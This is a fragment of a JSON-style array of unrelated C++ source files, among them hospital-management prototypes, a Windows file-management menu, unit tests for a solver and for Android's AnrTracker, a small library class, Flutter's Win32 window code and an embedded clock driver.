hire[], int &adddoctorindex);\r\nvoid changeequipmentmanager(int &managercheck, string &equipmentmanagername, string &equipmentmanagergender, string &equipmentmanagercnic, string filenameaddequipmentmanager);\r\nvoid addequipmentmanager(string equipmentmanagername, string equipmentmanagergender, string equipmentmanagercnic, int &managercheck, string filenameaddequipmentmanager);\r\nvoid updatepatient(string updatepatientcnic, string patientcnic[], int &addpatientindex, string patientname[], string patientage[], string patientbloodgroup[], string patienthistory[], string visitdatepatient[], string patientphonenumber[], string filenameaddpatient);\r\nstring pateintmenu();\r\nvoid doctorschedule(string doctorname[], string doctorspeciality[],string hire[], int &adddoctorindex);\r\nvoid viewdoctorslist(string doctorname[], string doctorspeciality[],string hire[], int &adddoctorindex);\r\nvoid selectdoctor(string selectdoctorname, string selectdoctorspeciality, int &adddoctorindex, string doctorname[], string doctorspeciality[], string hire[]);\r\nvoid availablebeds(string bedadd, int &addpatientindex);\r\nvoid billinginvoice(string servicetype[], int &addbillingindex, string daysstayes[], string roomtype[]);\r\nvoid reviewhearth();\r\nvoid bilslip(string servicetype[], string daysstayes[], string roomtype[], int &addbillingindex);\r\nstring viewprescription();\r\nvoid patientreview(string review[], int &addpatientindex);\r\nstring pharmacymenu();\r\nvoid addmedicineform(string medicinename[], string medicinequantity[], string medicineexpirydate[], string medicineprice[], string medicinebatchnumber[], int &addmedicineindex, string filenameaddmedicine);\r\nvoid viewmedicineform(string buymedicinequantity, int &addmedicineindex, string medicinename[], string medicinequantity[], string medicineexpirydate[], string medicineprice[], string medicinebatchnumber[], string filenameaddmedicine);\r\nvoid updatemedicineform(string updatemedicinebatchnumber, string medicinebatchnumber[], int &addmedicineindex, string medicinename[], string medicinequantity[], string medicineexpirydate[], string medicineprice[], string filenameaddmedicine);\r\nstring doctormenu();\r\nvoid buymedicines(string buymedicinequantity, string purchasemedicines, int &addmedicineindex, string medicinename[], string medicinequantity[], string medicineexpirydate[], string medicineprice[], string medicinebatchnumber[], string filenamebuymedicines);\r\nbool charactermCheck(string characterCheck);\r\nvoid expiredmedicine(int addmedicineindex, string currentdate[], string medicineexpirydate[], string medicinename[]);\r\nbool recursionCheck(string check, string recursion[], int size);\r\nbool checkenter(string check);\r\nbool gendercheck(string check);\r\nbool digitscheck(string digits);\r\nbool checkshiftin(string check[]);\r\nvoid addmanager(string managername, string managercnic);\r\nvoid medicineindemand();\r\nint convertDatetodays(string date); \r\nbool isExpired(string currentDate, string expiryDate);\r\nvoid removemedicine(string updatemedicinebatchnumber, int &addmedicineindex, string medicinebatchnumber[], string medicinename[], string medicinequantity[], string medicineexpirydate[], string medicineprice[], string filenameaddmedicine);\r\nvoid addemploy(string employname[], int &addemployindex, string employcnic[], string employphonenumbe",
    "#include <iostream>\r\n#include <fstream>\r\n#include <cstdio>\r\n#include <cstring>\r\n#include <windows.h>\r\n#include <direct.h>\r\n\r\nusing namespace std;\r\n\r\n// function to create a new file\r\nvoid create_file() {\r\n    string file_name;\r\n    cout << \"Enter the name of the file to create: \";\r\n    getline(cin, file_name);\r\n    ofstream file(file_name.c_str());\r\n    file.close();\r\n    cout << \"File '\" << file_name << \"' created successfully!\\n\";\r\n}\r\n\r\n// function to read the contents of a file\r\nvoid read_file() {\r\n    string file_name;\r\n    cout << \"Enter the name of the file to read: \";\r\n    getline(cin, file_name);\r\n    ifstream file(file_name.c_str());\r\n    if (file.is_open()) {\r\n        cout << \"Contents of file '\" << file_name << \"':\\n\";\r\n        string line;\r\n        while (getline(file, line)) {\r\n            cout << line << endl;\r\n        }\r\n        file.close();\r\n    } else {\r\n        cout << \"Unable to open file '\" << file_name << \"'!\\n\";\r\n    }\r\n}\r\n\r\n// function to write to a file\r\nvoid write_file() {\r\n    string file_name, content;\r\n    cout << \"Enter the name of the file to update: \";\r\n    getline(cin, file_name);\r\n    cout << \"Enter the content to add: \";\r\n    getline(cin, content);\r\n    ofstream file(file_name.c_str(), ios::app);\r\n    if (file.is_open()) {\r\n        file << content << endl;\r\n        file.close();\r\n        cout << \"File '\" << file_name << \"' updated successfully!\\n\";\r\n    } else {\r\n        cout << \"Unable to open file '\" << file_name << \"'!\\n\";\r\n    }\r\n}\r\n\r\n// function to delete a file\r\nvoid delete_file() {\r\n    string file_name;\r\n    cout << \"Enter the name of the file to delete: \";\r\n    getline(cin, file_name);\r\n    if (remove(file_name.c_str()) == 0) {\r\n        cout << \"File '\" << file_name << \"' deleted successfully!\\n\";\r\n    } else {\r\n        cout << \"Unable to delete file '\" << file_name << \"'!\\n\";\r\n    }\r\n}\r\n\r\n// function to check if a file exists\r\nbool file_exists(const char* file_name) {\r\n    DWORD file_attr = GetFileAttributesA(file_name);\r\n    return (file_attr != INVALID_FILE_ATTRIBUTES && !(file_attr & FILE_ATTRIBUTE_DIRECTORY));\r\n}\r\n\r\n// function to rename a file\r\nvoid rename_file() {\r\n    string old_name, new_name;\r\n    cout << \"Enter the name of the file to rename: \";\r\n    getline(cin, old_name);\r\n    cout << \"Enter the new name for the file: \";\r\n    getline(cin, new_name);\r\n    if (rename(old_name.c_str(), new_name.c_str()) == 0) {\r\n        cout << \"File '\" << old_name << \"' renamed to '\" << new_name << \"' successfully!\\n\";\r\n    } else {\r\n        cout << \"Unable to rename file '\" << old_name << \"'!\\n\";\r\n    }\r\n}\r\n\r\n// function to create a new directory\r\nvoid create_directory() {\r\n    string directory_name;\r\n    cout << \"Enter the name of the directory to create: \";\r\n    getline(cin, directory_name);\r\n    if (_mkdir(directory_name.c_str()) == 0) {\r\n        cout << \"Directory '\" << directory_name << \"' created successfully!\\n\";\r\n    } else {\r\n        cout << \"Unable to create directory '\" << directory_name << \"'!\\n\";\r\n    }\r\n}\r\n\r\n// function to delete a directory\r\nvoid delete_directory() {\r\n    string directory_name;\r\n    cout << \"Enter the name of the directory to delete: \";\r\n    getline(cin, directory_name);\r\n    if (_rmdir(directory_name.c_str()) == 0) {\r\n        cout << \"Directory '\" << directory_name << \"' deleted successfully!\\n\";\r\n    } else {\r\n        cout << \"Unable to delete directory '\" << directory_name << \"'!\\n\";\r\n    }\r\n}\r\n\r\n// function to list all files in a directory\r\nvoid list_directory() {\r\n    string directory_name;\r\n    cout << \"Enter the name of the directory to list: \";\r\n    getline(cin, directory_name);\r\n    WIN32_FIND_DATAA find_data;\r\n    HANDLE handle = FindFirstFileA((directory_name + \"/*\").c_str(), &find_data);\r\n    if (handle != INVALID_HANDLE_VALUE) {\r\n        cout << \"Files in directory '\" << directory_name << \"':\\n\";\r\n        do {\r\n            if (!(find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {\r\n                cout << find_data.cFileName << endl;\r\n            }\r\n        } while (FindNextFileA(handle, &find_data));\r\n        FindClose(handle);\r\n    } else {\r\n        cout << \"Unable to open directory '\" << directory_name << \"'!\\n\";\r\n    }\r\n}\r\n\r\n// main function\r\nint main() {\r\n    int choice;\r\n    do {\r\n        cout << \"File Management System Menu:\\n\";\r\n        cout << \"1. Create a new file\\n\";\r\n        cout << \"2. Read the contents of a file\\n\";\r\n        cout << \"3. Write to a file\\n\";\r\n        cout << \"4. Delete a file\\n\";\r\n        cout << \"5. Rename a file\\n\";\r\n        cout << \"6. Create a new directory\\n\";\r\n        cout << \"7. Delete a directory\\n\";\r\n        cout << \"8. List all files in a directory\\n\";\r\n        cout << \"9. Exit\\n\";\r\n        cout << \"Enter your choice (1-9): \";\r\n        cin >> choice;\r\n        cin.ignore();\r\n        switch (choice) {\r\n            case 1:\r\n                create_file();\r\n                break;\r\n            case 2:\r\n                read_file();\r\n                break;\r\n            case 3:\r\n           ",
    "/**\n * @file SolverUnitTests.cpp\n *\n * @brief SolverUnitTests test class for providing test methods for Solver project.\n *\n * @author Hovsep Papoyan\n * Contact: papoyanhovsep93@gmail.com\n * @Date 2024-03-28\n *\n */\n\n#include \"CppUnitTest.h\"\n#include \"../Solver/InputValidator.h\"\n#include \"../Solver/Solver.h\"\n\nusing namespace Microsoft::VisualStudio::CppUnitTestFramework;\n\nnamespace SolverUnitTests\n{\n\tTEST_CLASS(SolverUnitTests)\n\t{\n\tpublic:\n\t\tTEST_METHOD(InputValidatorTests)\n\t\t{\n\t\t\tstd::optional<std::vector<int>> res1{ std::nullopt };\n\n\t\t\t// Testing of argc (negative).\n\t\t\tconst char* const argv1[]{ \"ProgramName\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv1) / sizeof(argv1[0]), argv1), L\"InputValidatorTest1\");\n\n\t\t\tconst char* const argv2[]{ \"ProgramName\", \"1\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv2) / sizeof(argv2[0]), argv2), L\"InputValidatorTest2\");\n\n\t\t\tconst char* const argv3[]{ \"ProgramName\", \"1\", \"2\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv3) / sizeof(argv3[0]), argv3), L\"InputValidatorTest3\");\n\n\t\t\tconst char* const argv4[]{ \"ProgramName\", \"1\", \"2\", \"3\", \"4\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv4) / sizeof(argv4[0]), argv4), L\"InputValidatorTest4\");\n\n\t\t\t// Testing of argv (negative).\n\t\t\tconst char* const argv5[]{ \"ProgramName\", \"1\", \"2\", \"3.4\"};\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv5) / sizeof(argv5[0]), argv5), L\"InputValidatorTest5\");\n\n\t\t\tconst char* const argv6[]{ \"ProgramName\", \"1\", \"2\", \".\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv6) / sizeof(argv6[0]), argv6), L\"InputValidatorTest6\");\n\n\t\t\tconst char* const argv7[]{ \"ProgramName\", \"-1\", \"0\", \"1-\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv7) / sizeof(argv7[0]), argv7), L\"InputValidatorTest7\");\n\n\t\t\tconst char* const argv8[]{ \"ProgramName\", \"1\", \"2\", \"-0\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv8) / sizeof(argv8[0]), argv8), L\"InputValidatorTest8\");\n\n\t\t\tconst char* const argv9[]{ \"ProgramName\", \"1\", \"2\", \"000\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv9) / sizeof(argv9[0]), argv9), L\"InputValidatorTest9\");\n\n\t\t\tconst char* const argv10[]{ \"ProgramName\", \"+5\", \"-6\", \"-7\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv10) / sizeof(argv10[0]), argv10), L\"InputValidatorTest10\");\n\n\t\t\tconst char* const argv11[]{ \"ProgramName\", \"1\", \"2\", \"a\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv11) / sizeof(argv11[0]), argv11), L\"InputValidatorTest11\");\n\n\t\t\tconst char* const argv12[]{ \"ProgramName\", \"1\", \"2\", \"aaaaa\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv12) / sizeof(argv12[0]), argv12), L\"InputValidatorTest12\");\n\n\t\t\tconst char* const argv13[]{ \"ProgramName\", \"1\", \"2\", \"0x01\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv13) / sizeof(argv13[0]), argv13), L\"InputValidatorTest13\");\n\n\t\t\tconst char* const argv14[]{ \"ProgramName\", \"1\", \"2\", \"0234\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv14) / sizeof(argv14[0]), argv14), L\"InputValidatorTest14\");\n\n\t\t\tconst char* const argv15[]{ \"ProgramName\", \"1a\", \"2\", \"3\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv15) / sizeof(argv15[0]), argv15), L\"InputValidatorTest15\");\n\n\t\t\tconst char* const argv16[]{ \"ProgramName\", \"77777777777777\", \"1\", \"2\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv16) / sizeof(argv16[0]), argv16), L\"InputValidatorTest16\");\n\n\t\t\t// Testing of argc and argv (positive)\n\t\t\tres1 = { 1,2,3 };\n\t\t\tconst char* const argv17[]{ \"ProgramName\", \"1\", \"2\", \"3\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv17) / sizeof(argv17[0]), argv17), L\"InputValidatorTest17\");\n\t\t\t\n\t\t\tres1 = { 1,2,3,4,5,6 };\n\t\t\tconst char* const argv18[]{ \"ProgramName\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv18) / sizeof(argv18[0]), argv18), L\"InputValidatorTest18\");\n\n\t\t\tres1 = { 1,2,0 };\n\t\t\tconst char* const argv19[]{ \"ProgramName\", \"1\", \"2\", \"0\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv19) / sizeof(argv19[0]), argv19), L\"InputValidatorTest19\");\n\n\t\t\tres1 = { 1,0,2 };\n\t\t\tconst char* const argv20[]{ \"ProgramName\", \"1\", \"0\", \"2\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv20) / sizeof(argv20[0]), argv20), L\"InputValidatorTest20\");\n\n\t\t\tres1 = { 1,0,0 };\n\t\t\tconst char* const argv21[]{ \"ProgramName\", \"1\", \"0\", \"0\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv21) / sizeof(argv21[0]), argv21), L\"InputValidatorTest21\");\n\t\t}\n\t\tTEST_METHOD(SolverLinearTests)\n\t\t{\n\t\t\tusing namespace slv;\n\n\t\t\tSolver::Result res1 = -1.0;\n\t\t\tSolver::Result res2 = Solver::solve(0.0, 1.0, 1.0);\n\t\t\tAssert::Is",
    "/*\n * Copyright (C) 2020 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#include \"../AnrTracker.h\"\n\n#include <binder/Binder.h>\n#include <gtest/gtest.h>\n\nnamespace android {\n\nnamespace inputdispatcher {\n\n// --- AnrTrackerTest ---\n\n/**\n * Add a single entry and ensure it's returned as first, even if the token isn't valid\n */\nTEST(AnrTrackerTest, SingleEntry_First) {\n    AnrTracker tracker;\n\n    tracker.insert(1, nullptr);\n\n    ASSERT_EQ(1, tracker.firstTimeout());\n    ASSERT_EQ(tracker.firstToken(), nullptr);\n}\n\nTEST(AnrTrackerTest, MultipleEntries_RemoveToken) {\n    AnrTracker tracker;\n\n    sp<IBinder> token1 = sp<BBinder>::make();\n    sp<IBinder> token2 = sp<BBinder>::make();\n\n    tracker.insert(1, token1);\n    tracker.insert(2, token2);\n    tracker.insert(3, token1);\n    tracker.insert(4, token2);\n    tracker.insert(5, token1);\n\n    tracker.eraseToken(token1);\n\n    ASSERT_EQ(2, tracker.firstTimeout());\n}\n\nTEST(AnrTrackerTest, AddAndRemove_Empty) {\n    AnrTracker tracker;\n\n    ASSERT_TRUE(tracker.empty());\n\n    tracker.insert(1, nullptr);\n    ASSERT_FALSE(tracker.empty());\n\n    tracker.erase(1, nullptr);\n    ASSERT_TRUE(tracker.empty());\n}\n\nTEST(AnrTrackerTest, Clear) {\n    AnrTracker tracker;\n\n    tracker.insert(1, nullptr);\n    tracker.clear();\n    ASSERT_TRUE(tracker.empty());\n}\n\nTEST(AnrTrackerTest, SingleToken_MaintainsOrder) {\n    AnrTracker tracker;\n\n    ASSERT_TRUE(tracker.empty());\n\n    tracker.insert(2, nullptr);\n    tracker.insert(5, nullptr);\n    tracker.insert(0, nullptr);\n\n    ASSERT_EQ(0, tracker.firstTimeout());\n    ASSERT_EQ(nullptr, tracker.firstToken());\n}\n\nTEST(AnrTrackerTest, MultipleTokens_MaintainsOrder) {\n    AnrTracker tracker;\n\n    sp<IBinder> token1 = sp<BBinder>::make();\n    sp<IBinder> token2 = sp<BBinder>::make();\n\n    tracker.insert(2, token1);\n    tracker.insert(5, token2);\n    tracker.insert(0, token2);\n\n    ASSERT_EQ(0, tracker.firstTimeout());\n    ASSERT_EQ(token2, tracker.firstToken());\n}\n\nTEST(AnrTrackerTest, MultipleTokens_IdenticalTimes) {\n    AnrTracker tracker;\n\n    sp<IBinder> token1 = sp<BBinder>::make();\n    sp<IBinder> token2 = sp<BBinder>::make();\n\n    tracker.insert(2, token1);\n    tracker.insert(2, token2);\n    tracker.insert(10, token2);\n\n    ASSERT_EQ(2, tracker.firstTimeout());\n    // Doesn't matter which token is returned - both are valid results\n    ASSERT_TRUE(token1 == tracker.firstToken() || token2 == tracker.firstToken());\n}\n\nTEST(AnrTrackerTest, MultipleTokens_IdenticalTimesRemove) {\n    AnrTracker tracker;\n\n    sp<IBinder> token1 = sp<BBinder>::make();\n    sp<IBinder> token2 = sp<BBinder>::make();\n\n    tracker.insert(2, token1);\n    tracker.insert(2, token2);\n    tracker.insert(10, token2);\n\n    tracker.erase(2, token2);\n\n    ASSERT_EQ(2, tracker.firstTimeout());\n    ASSERT_EQ(token1, tracker.firstToken());\n}\n\nTEST(AnrTrackerTest, Empty_DoesntCrash) {\n    AnrTracker tracker;\n\n    ASSERT_TRUE(tracker.empty());\n\n    ASSERT_EQ(LLONG_MAX, tracker.firstTimeout());\n    // Can't call firstToken() if tracker.empty()\n}\n\nTEST(AnrTrackerTest, RemoveInvalidItem_DoesntCrash) {\n    AnrTracker tracker;\n\n    tracker.insert(1, nullptr);\n\n    // Remove with non-matching timestamp\n    tracker.erase(2, nullptr);\n    ASSERT_EQ(1, tracker.firstTimeout());\n    ASSERT_EQ(nullptr, tracker.firstToken());\n\n    // Remove with non-matching token\n    tracker.erase(1, sp<BBinder>::make());\n    ASSERT_EQ(1, tracker.firstTimeout());\n    ASSERT_EQ(nullptr, tracker.firstToken());\n\n    // Remove with both non-matching\n    tracker.erase(2, sp<BBinder>::make());\n    ASSERT_EQ(1, tracker.firstTimeout());\n    ASSERT_EQ(nullptr, tracker.firstToken());\n}\n\n} // namespace inputdispatcher\n\n} // namespace android\n",
    "#include <iostream>\n#include <string>\n\nusing namespace std;\n\nclass Book {\npublic:\n    string title;\n    string author;\n\n    Book(string t, string a)\n    {\n        title = t;\n        author = a;\n    }\n};\n\nclass Library {\nprivate:\n    static const int Max_Books = 100;\n    Book* books[Max_Books];\n    int num_books;\n\npublic:\n    Library()\n    {\n        num_books = 0;\n   \n    }\n\n    void add_book(Book* book) {\n        if (num_books < Max_Books) {\n            books[num_books++] = book;\n        }\n        else {\n            cout << \"Library is full!\" << endl;\n        }\n    }\n\n    void remove_book(Book* book) {\n        for (int i = 0; i < num_books; ++i) {\n            if (books[i] == book) {\n             \n                books[i] = books[num_books - 1];\n                num_books--;\n                cout << \"Book removed from the library.\" << endl;\n                return;\n            }\n        }\n        cout << \"Book not found in the library.\" << endl;\n    }\n\n    void search_by_title(string title) {\n        bool found = false;\n        for (int i = 0; i < num_books; ++i) {\n            if (books[i]->title == title) {\n                cout << \"Title: \" << books[i]->title << \", Author: \" << books[i]->author << endl;\n                found = true;\n            }\n        }\n        if (!found) {\n            cout << \"No books found with the given title.\" << endl;\n        }\n    }\n\n    void search_by_author(string author) {\n        bool found = false;\n        for (int i = 0; i < num_books; ++i) {\n            if (books[i]->author == author) {\n                cout << \"Title: \" << books[i]->title << \", Author: \" << books[i]->author << endl;\n                found = true;\n            }\n        }\n        if (!found) {\n            cout << \"This Author has not written any book.\" << endl;\n        }\n    }\n  \n};\n\nint main() {\n    Library library;\n\n    Book book1(\"Object Oriented Programming\", \"Tonny Gaddis\");\n    Book book2(\"C++ by Me\", \"Mr Abdullah\");\n\n    library.add_book(&book1);\n    library.add_book(&book2);\n\n    cout << \"Books by title:\" << endl;\n    library.search_by_title(\"Object Oriented Programming\");\n\n    cout << \"\\nBooks by author:\" << endl;\n    library.search_by_author(\"Mr Abdullah\");\n\n    cout << \"\\nRemoving a book...\" << endl;\n    library.remove_book(&book1);\n\n    return 0;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"AccurateClock.h\"\r\n#include \"../drivers/counter.h\"\r\n#if defined(EMULATION)\r\n#include \"../pld/xparameters.h\"\r\n#endif\r\n\r\n\r\n/// \u00ca\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00e2\u00ee \u00f1\u00e5\u00ea\u00f3\u00ed\u00e4 \u00e7\u00e0 \u00ee\u00e4\u00e8\u00ed \u00f2\u00e0\u00ea\u00f2 \u00ef\u00f0\u00ee\u00f6\u00e5\u00f1\u00f1\u00ee\u00f0\u00e0.\r\nconstexpr unsigned NANOSECONDS_PER_CYCLES { 1000000000 / XPAR_CPU_CORE_CLOCK_FREQ_HZ };\r\n\r\nuint64_t IAccurateClock::_cycles { 0 };\r\n\r\ntime_t IAccurateClock::_startTime { 0 };\r\n\r\nvoid IAccurateClock::SetStartTime(const time_t startTime)\r\n{\r\n\t_startTime = startTime;\r\n}\r\n\r\ntime_t IAccurateClock::GetStartTime()\r\n{\r\n\treturn _startTime;\r\n}\r\n\r\nTimeStamp IAccurateClock::GetStartTimeStamp()\r\n{\r\n\treturn TimeStamp(_startTime, 0);\r\n}\r\n\r\n\r\n\r\n\r\n\r\nCounter AccurateClock::_cyclesCounter { Counter::ctMeasure };\r\n\r\nvoid AccurateClock::Start()\r\n{\r\n\tSetTimer(DELAY_TIME_VALUE_UPDATE, msTimeValueUpdate);\r\n\t_cyclesCounter.ResetAndStart();\r\n}\r\n\r\nvoid AccurateClock::Stop()\r\n{\r\n\tKillTimer(msTimeValueUpdate);\r\n\t_cyclesCounter.ResetAndStop();\r\n}\r\n\r\nTimeStamp AccurateClock::GetTimeStamp() const\r\n{\r\n\treturn TimeStamp((_cycles + static_cast<uint64_t>(_cyclesCounter.GetCount()))\r\n\t\t* static_cast<uint64_t>(NANOSECONDS_PER_CYCLES));\r\n}\r\n\r\nDISPATCH_MESSAGE_RESULT AccurateClock::MFD_DispatchMessage(MESSAGES message, DWORD lParam, DWORD wParam)\r\n{\r\n\tDISPATCH_MESSAGE_RESULT result(dmrNotDispatched);\r\n\r\n\tswitch (message)\r\n\t{\r\n\t\tcase msTimeValueUpdate:\r\n\t\t\t_cycles += static_cast<uint64_t>(_cyclesCounter.GetCount());\r\n\t\t\t_cyclesCounter.ResetAndStart();\r\n\t\t\tbreak;\r\n\t\tdefault:\r\n\t\t\tresult = dmrNotDispatched;\r\n\t\t\tbreak;\r\n\t}\r\n\treturn result;\r\n}",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the 